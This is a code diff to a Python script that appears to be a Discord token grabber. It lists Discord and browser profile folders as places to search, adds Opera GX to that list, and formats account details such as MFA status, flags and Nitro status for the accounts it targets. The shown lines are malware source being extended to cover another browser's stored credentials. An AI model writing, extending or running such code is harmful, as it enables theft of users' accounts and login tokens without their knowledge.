@@ -53,6 +53,7 @@ PATHS = {
 	"Discord PTB"       : ROAMING + "\\discordptb",
 	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
 	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
 	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
 	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
 }
@@ -157,7 +158,7 @@ def main():
 			verified = user_data['verified']
 			mfa_enabled = user_data['mfa_enabled']
 			flags = user_data['flags']
-			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000)#.strftime("%d-%m-%Y・%H:%M:%S")
+			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")
 
 			language = languages.get(locale)
 			nitro = bool(user_data.get("premium_type"))
